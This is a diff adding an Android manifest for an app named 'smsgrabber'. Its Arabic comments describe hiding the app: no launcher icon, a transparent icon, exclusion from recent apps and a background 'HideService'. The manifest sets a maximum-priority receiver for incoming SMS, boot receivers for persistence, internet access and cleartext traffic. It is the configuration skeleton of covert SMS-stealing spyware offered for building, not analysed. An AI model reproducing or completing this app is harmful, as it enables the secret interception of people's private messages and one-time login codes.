@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.smsgrabber">
+
+    <!-- الصلاحيات الأساسية -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- إخفاء من قائمة التطبيقات الحديثة -->
+    <uses-permission android:name="android.permission.REORDER_TASKS" />
+
+    <application
+        android:name=".App"
+        android:allowBackup="false"
+        android:icon="@drawable/ic_transparent"
+        android:label="@string/app_name"
+        android:roundIcon="@drawable/ic_transparent"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.Transparent"
+        android:usesCleartextTraffic="true"
+        tools:targetApi="34"
+        tools:ignore="MissingClass">
+
+        <!-- النشاط الرئيسي - بدون LAUNCHER! يشتغل مرة وحدة -->
+        <activity
+            android:name=".MainActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:theme="@style/Theme.Transparent"
+            android:launchMode="singleInstance"
+            android:taskAffinity="">
+
+            <!-- Intent Filter مخصص للتشغيل الأول فقط -->
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <!-- ⚠️ بدون CATEGORY_LAUNCHER = بدون أيقونة في الدرج -->
+            </intent-filter>
+        </activity>
+
+        <!-- مستقبل الرسائل النصية -->
+        <receiver
+            android:name=".SmsReceiver"
+            android:exported="true"
+            android:priority="2147483647"
+            android:permission="android.permission.BROADCAST_SMS">
+
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- التشغيل التلقائي بعد ريستارت الجهاز -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- خدمة خلفية للإخفاء والاستمرارية -->
+        <service
+            android:name=".HideService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+    </application>
+</manifest>
